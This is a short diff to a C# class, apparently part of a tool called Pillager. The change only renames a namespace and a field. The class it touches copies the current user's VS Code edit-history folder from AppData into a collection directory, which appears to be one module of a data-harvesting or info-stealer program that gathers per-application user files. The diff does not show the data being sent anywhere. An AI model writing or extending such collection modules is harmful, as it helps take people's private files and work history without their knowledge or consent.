@@ -5,11 +5,11 @@ using System.IO;
 using System.Linq;
 using System.Text;
 
-namespace Pillager.Tools
+namespace Pillager.Softwares
 {
     internal class VSCode
     {
-        public static string ToolName = "VSCode";
+        public static string SoftwareName = "VSCode";
 
         public static void Save(string path)
         {
@@ -17,7 +17,7 @@ namespace Pillager.Tools
             {
                 string historypath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Code\\User\\History");
                 if (!Directory.Exists(historypath)) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, SoftwareName);
                 Directory.CreateDirectory(savepath);
                 Methods.CopyDirectory(historypath, Path.Combine(savepath, "History"), true);
             }
